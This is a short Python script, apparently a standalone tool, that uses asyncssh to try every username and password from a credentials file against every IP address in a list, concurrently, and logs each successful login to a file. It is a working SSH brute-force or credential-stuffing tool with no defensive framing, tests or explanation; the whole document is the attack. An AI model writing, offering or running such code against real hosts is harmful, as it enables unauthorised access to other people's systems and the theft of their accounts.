import asyncio
import asyncssh


async def check_ssh_connection(ip, username, password):
    try:
        async with asyncssh.connect(ip, username=username, password=password) as conn:
            print(f"SSH connection successful for {username}@{ip}")
            with open('working.txt', 'a') as file:
                file.write(f"{username}:{password}@{ip}\n")
    except (OSError, asyncssh.Error) as e:
        print(f"Failed to connect to {username}@{ip}: {str(e)}")


async def main():
    # Read IP addresses from ips.txt
    with open('ips.txt', 'r') as ips_file:
        ips = ips_file.read().splitlines()

    # Read username/password combinations from combo.txt
    with open('credentials.txt', 'r') as combo_file:
        combos = [line.strip().split(':') for line in combo_file]

    tasks = []
    for ip in ips:
        for combo in combos:
            username, password = combo
            task = asyncio.create_task(
                check_ssh_connection(ip, username, password))
            tasks.append(task)

    await asyncio.gather(*tasks)

# Run the main function
asyncio.run(main())
